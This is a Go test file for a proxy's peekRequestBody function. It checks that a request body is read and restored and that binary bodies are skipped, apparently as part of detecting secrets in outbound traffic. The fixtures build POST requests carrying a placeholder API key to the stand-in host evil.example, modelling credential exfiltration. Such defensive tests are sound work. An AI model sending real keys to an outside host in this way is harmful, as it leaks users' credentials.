package proxy

import (
	"io"
	"net/http"
	"strings"
	"testing"
)

func TestPeekRequestBodyRestores(t *testing.T) {
	body := `{"api_key":"sk-denyouttest000000000000000"}`
	req, err := http.NewRequest(http.MethodPost, "https://evil.example/", strings.NewReader(body))
	if err != nil {
		t.Fatal(err)
	}
	req.Header.Set("Content-Type", "application/json")
	prefix := peekRequestBody(req, 65536)
	if string(prefix) != body {
		t.Fatalf("prefix=%q", prefix)
	}
	got, err := io.ReadAll(req.Body)
	if err != nil {
		t.Fatal(err)
	}
	if string(got) != body {
		t.Fatalf("restored body=%q", got)
	}
}

func TestPeekRequestBodySkipsBinary(t *testing.T) {
	req, err := http.NewRequest(http.MethodPost, "https://evil.example/", strings.NewReader("sk-denyouttest000000000000000"))
	if err != nil {
		t.Fatal(err)
	}
	req.Header.Set("Content-Type", "application/octet-stream")
	if prefix := peekRequestBody(req, 65536); prefix != nil {
		t.Fatalf("expected nil for binary, got %q", prefix)
	}
}
